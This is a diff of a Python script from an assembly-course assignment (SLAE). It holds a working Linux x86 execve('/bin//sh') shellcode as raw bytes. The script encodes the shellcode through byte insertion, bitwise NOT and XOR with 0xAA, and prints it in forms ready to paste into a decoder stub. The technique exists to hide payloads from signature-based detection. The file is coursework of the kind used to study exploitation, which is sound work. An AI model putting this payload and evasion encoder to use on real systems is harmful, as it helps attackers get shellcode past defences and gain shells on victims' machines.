@@ -1,39 +1,34 @@
 #!/usr/bin/python3
 '''
-Filename:   encoder.py  
+Filename:   encoder.py
 Author:     aus-mate
 Purpose:    This code was written for assignment #4 of the SecurityTube Linux Assembly Expert certification.
 Student ID: SLAE-1555
 '''
-byte_encode = 'ISO-8859-1'
-shellcode = bytearray("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", byte_encode)
-not_shellcode = bytearray("", byte_encode) 
-ins_shellcode = bytearray("", byte_encode)
-xor_shellcode = bytearray("", byte_encode)
+shellcode = bytearray("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", 'ISO-8859-1')
+ins_encoded = bytearray("", 'ISO-8859-1')
+not_encoded = bytearray("", 'ISO-8859-1')
+enc_shellcode = bytearray("", 'ISO-8859-1')
 
 print("Original: " + "\"" + "".join("\\x%02x" % i for i in shellcode) + "\"")
 
 for i in shellcode:
-    ins_shellcode.append(i)
-    ins_shellcode += b'\x51\x43'
+    ins_encoded.append(i)
+    ins_encoded += b'\x51\x43'
 
-print("\nINS Encoded: " + "\"" + "".join("\\x%02x" % i for i in ins_shellcode) + "\"")
+print("\nINS Encoded: " + "\"" + "".join("\\x%02x" % i for i in ins_encoded) + "\"")
 
-for i in ins_shellcode:
+for i in ins_encoded:
     x = ~i
-    not_shellcode += bytes.fromhex('%02x' % (x & 0xff))
+    not_encoded += bytes.fromhex('%02x' % (x & 0xff))
 
-print("\nNOT Encoded: " + "\"" + "".join("\\x%02x" % i for i in not_shellcode) + "\"")
+print("\nNOT Encoded: " + "\"" + "".join("\\x%02x" % i for i in not_encoded) + "\"")
 
-"""
-for i in shellcode:
-    not_shellcode.append(shellcode)
-print("Original: " + "\""+"".join("\\x%02x" % i for i in shellcode) + "\"")
-print("\nNOT Encoded: " + "\"" + "".join("\\x%02x" % i for i in bytearray(not_shellcode, 'ISO-8859-1') + "\""))
-"""
-"""
-for i in bytearray(not_shellcode, 'ISO-8859-1'):
-  ins_shellcode += ('\\x' + '%02x' % (i & 0xff)) + '\\x51\\xae'
+for i in not_encoded:
+    x = i^0xAA
+    enc_shellcode += bytes.fromhex('%02x' % (x & 0xff))
 
- print("\nInsertion Encoded: " + "\"" + ins_shellcode + "\"")
-"""
+enc_shellcode += b'\xaa'
+
+print("\nEncoded: " + "\"" + "".join("\\x%02x" % i for i in enc_shellcode) + "\"")
+print("\nEncoded: " + "".join("0x%02x," % i for i in enc_shellcode))
